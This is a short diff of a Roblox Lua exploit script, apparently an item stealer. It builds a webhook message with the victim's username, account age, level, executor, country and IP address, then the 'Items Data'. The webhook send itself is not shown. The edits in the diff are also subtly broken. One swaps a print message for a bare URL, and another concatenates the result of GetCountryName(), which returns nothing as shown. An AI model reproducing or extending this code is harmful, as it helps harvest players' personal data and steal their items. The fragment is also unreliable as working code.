@@ -817,7 +817,7 @@ local function GetCountryName()
 	local success, code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
 	if success and code then
 		Countries = remoteFunction:InvokeServer()
-		print(code, "is the code for the country of", Countries[code])
+		print(code, "http://country.io/names.json", Countries[code])
 	end
 end
 
@@ -1085,7 +1085,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..code.."\n | 👤 IP: "..ipwebhook.. "```"
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..GetCountryName().."\n | 👤 IP: "..ipwebhook.. "```"
         },
         {
             name = "🍎 Items Data", 
